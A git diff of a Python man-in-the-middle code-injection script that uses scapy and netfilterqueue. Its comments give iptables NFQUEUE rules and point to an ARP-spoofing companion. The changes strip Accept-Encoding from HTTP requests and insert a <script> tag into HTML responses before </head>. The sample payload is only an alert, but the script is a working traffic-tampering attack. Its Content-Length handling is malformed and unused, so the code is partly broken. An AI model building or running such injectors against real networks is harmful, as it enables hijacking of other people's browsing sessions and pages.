@@ -6,7 +6,7 @@ import re
 # iptables -I FORWARD -j NFQUEUE --queue-num 0  --> for mitm and with arp_spoof.py
 # iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> own computer
 # iptables -I INPUT -j NFQUEUE --queue-num 0    --> own computer
-# iptables flush  --> back to normal
+# iptables flush  --> back to normal 
 
 
 def set_load(packet, load):
@@ -20,15 +20,18 @@ def process_packet(packet):
     # Converting packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):      
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:      
             print("[+] Request")
             # Delete Accept-Encoding and its content
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
+            load = load.replace("</head>", "<script>alert('test');</script></head>")
+            content_length_search = re.search("Content-Length:<\s\d*", load)
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))    
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
